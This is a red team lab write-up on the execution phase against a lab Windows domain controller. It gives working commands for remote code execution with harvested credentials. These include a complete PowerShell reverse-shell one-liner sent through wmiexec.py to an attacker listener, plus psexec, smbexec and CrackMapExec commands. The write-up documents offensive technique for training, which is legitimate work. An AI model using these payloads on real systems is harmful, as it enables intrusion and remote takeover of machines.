
Phase 3: Execution – Full Kill Chain Red Team Project
Author: Sibin Sunny
Date: 2025-07-07

---

## Objective
To gain remote code execution on a compromised Windows Domain Controller using valid credentials harvested during Phase 2 (Credential Access). Multiple techniques were tested and documented to simulate real-world red teaming scenarios.

---

## Lab Overview

- **Attacker Machine**: Kali Linux (192.168.50.10)
- **Target Machine**: Windows Server 2019 (192.168.50.5)
- **User Compromised**: CORP\BOB
- **Credential**: CORP\BOB : Passw0rd!
- **Toolset Used**: Impacket, CrackMapExec, Netcat, Nmap

---

## MITRE ATT&CK Mapping

- **T1059.001** – Command and Scripting Interpreter: PowerShell
- **T1021.002** – Remote Services: SMB/Windows Admin Shares
- **T1077** – Windows Admin Shares

---

## Execution Techniques Tested

### Step 1: PowerShell Reverse Shell via wmiexec.py (Successful)

Command used:

```bash
python3 /usr/share/doc/python3-impacket/examples/wmiexec.py CORP/BOB:'Passw0rd!'@192.168.50.5 \
"powershell -nop -w hidden -c \"\$client = New-Object System.Net.Sockets.TCPClient('192.168.50.10',4444); \
\$stream = \$client.GetStream(); [byte[]]\$bytes = 0..65535|%{0}; while((\$i = \$stream.Read(\$bytes, 0, \
\$bytes.Length)) -ne 0){ \$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString(\$bytes, 0, \
\$i); \$sendback = (iex \$data 2>&1 | Out-String ); \$sendback2 = \$sendback + 'PS ' + (pwd).Path + '> '; \
\$sendbyte = ([text.encoding]::ASCII).GetBytes(\$sendback2); \$stream.Write(\$sendbyte, 0, \
\$sendbyte.Length); \$stream.Flush() }; \$client.Close()\""
```

Shell received with:

```bash
nc -lvnp 4444
```

Outcome: Successfully received a remote PowerShell shell from the Domain Controller as CORP\BOB.

---

### Step 2: psexec.py

Command:
```bash
python3 /usr/share/doc/python3-impacket/examples/psexec.py CORP/BOB:'Passw0rd!'@192.168.50.5
```

Outcome: Remote command execution using Windows service creation confirmed. Shell access achieved.

---

### Step 3: smbexec.py

Command:
```bash
python3 /usr/share/doc/python3-impacket/examples/smbexec.py CORP/BOB:'Passw0rd!'@192.168.50.5
```

Outcome: Remote interactive shell achieved via SMB session. 

---

### Step 4: CrackMapExec RCE

Command:
```bash
crackmapexec smb 192.168.50.5 -u bob -p 'Passw0rd!' -x "whoami"
```

Outcome: Successfully executed remote command and verified access level.

---

## Conclusion

Phase 3 successfully demonstrated multiple execution paths using valid credentials. The most effective technique was a PowerShell reverse shell using `wmiexec.py`, allowing full interactive access. These methods simulate attacker behavior after credential compromise and are critical for showcasing red team capabilities.

---

Screenshots were taken for each successful technique for documentation and validation purposes.
